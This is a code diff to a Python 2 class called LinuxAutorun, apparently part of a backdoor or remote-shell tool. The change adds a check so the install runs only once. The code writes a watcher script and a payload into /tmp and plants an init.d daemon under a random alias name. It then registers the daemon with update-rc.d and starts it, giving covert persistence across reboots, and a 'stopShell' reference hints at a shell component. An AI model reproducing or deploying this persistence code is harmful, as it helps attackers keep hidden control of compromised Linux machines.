@@ -152,20 +152,20 @@ class LinuxAutorun(threading.Thread):
                 '        stopShell()')
 
     def run(self):
-
-        code = self.watcher_code()
-        open("watch.py", 'w').write(code)
-        os.system("mv " + self.original_wd + "/watch.py /tmp/watch.py \n")
-        code = self.deamon_shell_code()
-        self.deamon_script = os.path.join('/etc/init.d/', self.random_alias_name)
-        open(self.deamon_script, 'w').write(code)
-        print "Wrote deamon code to script", self.deamon_script
-        os.system("chmod 555 /tmp/payload.py\n")
-        st = os.stat(self.deamon_script)
-        os.system("chmod +x /etc/init.d/" + self.random_alias_name + "\n")
-        os.chmod(self.deamon_script, st.st_mode | stat.S_IEXEC)
-        os.system("update-rc.d " + self.random_alias_name + " defaults \n")
-        os.system("service " + self.random_alias_name + " start \n")
+        if not os.path.isfile("/tmp/watch.py"):
+                code = self.watcher_code()
+                open("watch.py", 'w').write(code)
+                os.system("mv " + self.original_wd + "/watch.py /tmp/watch.py \n")
+                code = self.deamon_shell_code()
+                self.deamon_script = os.path.join('/etc/init.d/', self.random_alias_name)
+                open(self.deamon_script, 'w').write(code)
+                print "Wrote deamon code to script", self.deamon_script
+                os.system("chmod 555 /tmp/payload.py\n")
+                st = os.stat(self.deamon_script)
+                os.system("chmod +x /etc/init.d/" + self.random_alias_name + "\n")
+                os.chmod(self.deamon_script, st.st_mode | stat.S_IEXEC)
+                os.system("update-rc.d " + self.random_alias_name + " defaults \n")
+                os.system("service " + self.random_alias_name + " start \n")
 
 
 
